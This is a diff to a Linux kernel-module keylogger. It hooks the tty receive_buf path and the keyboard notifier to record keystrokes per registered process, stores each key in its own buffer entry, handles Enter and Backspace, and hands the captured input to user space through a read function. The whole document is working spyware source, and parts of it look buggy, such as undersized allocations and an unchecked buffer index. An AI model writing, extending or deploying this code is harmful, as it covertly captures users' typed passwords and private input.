@@ -40,8 +40,10 @@ struct logged_key {
 
 static struct logged_key *key_buffer;
 static unsigned int num_keys_logged = 0;
+static struct logged_key *ttykey_buffer;
+static unsigned int num_tty_keys_logged = 0;
 
-static char *tty_buffer = NULL, *pid_buffer = NULL;
+static char *pid_buffer = NULL;
 static int cur_buf_length = 0;
 static int cur_ttybuf_length = 0;
 static pid_t registered_pids[MAX_REGISTERED_PROCS];
@@ -64,6 +66,7 @@ int key_release( struct inode *inode, struct file *filp );
 * Return 1 if key was interpreted as a meta key, 0 otherwise
 */
 static int interpret_meta_key( unsigned int keycode, unsigned int down );
+static int interpret_tty_meta_key( char* keycode );
 
 struct file_operations fops = {
     read:    key_read,
@@ -173,17 +176,26 @@ ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
 
 ssize_t tty_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
     int err = 0;
+    int i;
+    struct logged_key *curr = NULL;
 
     if ( *f_pos == 0 ) {
-        err = copy_to_user( buf, tty_buffer, cur_ttybuf_length );
-        if ( err < 0 ) {
-            print812( "Copying to user failed (%d)", err );
-            return err;
+        for( i = 0; i < num_tty_keys_logged; i++ ) {
+            curr = &ttykey_buffer[i];
+
+            err = copy_to_user( buf + *f_pos, curr->name, curr->name_len );
+            if ( err < 0 ) {
+                print812( "Copying to user failed (%d)", err );
+                return err;
+            }
+       
+            // Free the key
+            *f_pos += curr->name_len;
+            free_key( curr );
         }
 
-        *f_pos = cur_ttybuf_length;
-        cur_ttybuf_length = 0; // Reset buf length to read more content
-        return *f_pos;
+        num_tty_keys_logged = 0;
+        return *f_pos; 
     } else {
         return 0;
     }
@@ -241,7 +253,9 @@ void SendKey()
 
 void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
 {   
-	const char *key_name = NULL; 
+	const char *key_name = NULL;
+    unsigned int name_len = 0;
+    struct logged_key *next_key = NULL; 
 
     if(registered_proc_count && (count > 0))
     {
@@ -253,14 +267,30 @@ void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, 
             
             key_name = get_tty_key_str(dstStr, count);
 
-            if ( strlen( key_name ) + cur_ttybuf_length < KEYLOG_BUF_SIZE ) {
-                cur_ttybuf_length += sprintf( tty_buffer + cur_ttybuf_length, "%s", key_name );
+            if( interpret_tty_meta_key( key_name ) ) {
+                /* call the original receive_buf */
+                (*old_receive_buf)(tty, cp, fp, count);
+                
+                return;
+            }
+
+            name_len = strlen( key_name );
+            next_key = &ttykey_buffer[num_tty_keys_logged];
+
+            next_key->name = kzalloc( name_len, GFP_KERNEL );
+            if( next_key->name == NULL ) {
+                print812( "Failed to allocate key name buffer - skipping key '%s'", key_name );
+                
+                /* call the original receive_buf */
+                (*old_receive_buf)(tty, cp, fp, count);
+                
+                return;
             }
             
-            // Wait until a command has been entered before notifying listeners
-            if ( strcmp( "[Enter]", key_name ) == 0  ) {
-                SendKey();
-            }
+            next_key->name_len = name_len;
+            sprintf( next_key->name, "%s", key_name );
+
+            num_tty_keys_logged++;
         }
     }
 
@@ -330,6 +360,22 @@ static int interpret_meta_key( unsigned int keycode, unsigned int down  ) {
     return 0;
 }
 
+static int interpret_tty_meta_key( char* keycode ) {
+    if( strcmp( keycode, "[Enter]" ) == 0 ) {
+        SendKey();
+        return 1;
+    }
+    else if( strcmp( keycode, "[Bksp]" ) == 0 ) {
+        if ( num_tty_keys_logged > 0 ) {
+            free_key( &ttykey_buffer[num_tty_keys_logged - 1] );
+            num_tty_keys_logged--;
+        }
+        return 1;        
+    }
+
+    return 0;
+}
+
 static struct notifier_block keyboardNotifierBlock = {
         .notifier_call = keylogger_notify
 };
@@ -367,8 +413,8 @@ static int keylogger_init( void ) {
         return err;
     }
 
-    tty_buffer = kzalloc( sizeof(char) * KEYLOG_BUF_SIZE, GFP_KERNEL );
-    if ( !tty_buffer ) {
+    ttykey_buffer = kzalloc( sizeof(char) * KEYLOG_BUF_SIZE, GFP_KERNEL );
+    if ( !ttykey_buffer ) {
         err = -ENOMEM;
         print812( "Failed to allocate tty buffer (%d)", err );
 
@@ -434,8 +480,8 @@ static void keylogger_exit( void ) {
         kfree( key_buffer );
     }
 
-    if ( tty_buffer != NULL ) {
-        kfree( tty_buffer );
+    if ( ttykey_buffer != NULL ) {
+        kfree( ttykey_buffer );
     }
 
     if ( pid_buffer != NULL ) {
